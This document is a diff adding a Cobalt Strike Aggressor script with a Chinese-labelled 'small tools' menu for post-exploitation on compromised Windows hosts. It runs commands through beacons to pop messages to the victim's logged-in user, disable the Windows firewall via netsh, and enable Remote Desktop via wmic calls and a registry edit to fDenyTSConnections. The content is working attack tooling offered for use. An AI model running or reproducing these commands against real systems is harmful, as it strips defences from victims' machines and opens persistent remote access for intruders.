@@ -1,0 +1,55 @@
+sub Send {
+        $username = replace(beacon_info($bid,"user"),' \*',"");
+        $msg = $3['msg'];
+        if(($username cmp "SYSTEM") == 0){
+            show_error("Cannot send message with SYSTEM !");
+            return;
+        }
+        bshell($bid,"msg $username \"$msg\"");
+    }
+
+sub Close_firewall{
+   $ver = beacon_info($1['@'],"ver");
+   if (double($ver) lt 5.2){
+       brun($1, "netsh firewall set opmode disable");
+       return;
+   }
+   brun($1, "netsh advfirewall set allprofiles state off");
+}
+sub Open_rdp{
+   $ver = beacon_info($1['@'],"ver");
+   if (double($ver) lt 5.2){
+       brun($1, "wmic path win32_terminalservicesetting where (__CLASS !=\"\") call setallowtsconnections 1");
+       return;
+   }
+   brun($1, "wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=\"\") call setallowtsconnections 1");
+   brun($1, "wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName='RDP-Tcp') call setuserauthenticationrequired 1");
+   brun($1, "REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f");
+}
+menu "小工具"{
+    item "弹框"{
+        $bid = $1['@'];
+        $dialog = dialog("Chat", %(msg => "Hello: ".beacon_info($bid,"user"),bid => $bid), &Send);
+        dialog_description($dialog, "弹窗");
+        drow_text_big($dialog,"msg","Message:");
+        dbutton_action($dialog, "Send");
+        dialog_show($dialog);
+        }
+    item "关闭防火墙"{
+        if (!-isadmin $1['@']){
+                show_error("权限不足");
+                return;
+        }
+        Close_firewall($1);
+    }
+    item "开启RDP"{
+        local('$bid');
+        $bid = $1;
+        if (!-isadmin $bid['@']){
+            show_error("权限不足");
+                return;
+        }
+        Open_rdp($1);
+    }
+
+}
